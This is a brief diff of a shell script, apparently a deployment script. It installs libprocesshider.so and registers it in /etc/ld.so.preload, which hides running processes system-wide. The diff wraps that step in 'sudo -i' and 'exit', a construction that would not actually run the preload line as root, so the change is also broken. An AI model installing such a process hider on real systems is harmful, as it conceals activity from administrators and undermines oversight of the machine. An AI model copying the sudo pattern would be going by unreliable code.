@@ -36,7 +36,11 @@ fi
 
 mv libprocesshider.so /usr/local/lib/
 
+sudo -i 
+
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+exit
 
 mv dev-inventory.yml ../dev-inventory.yml
 
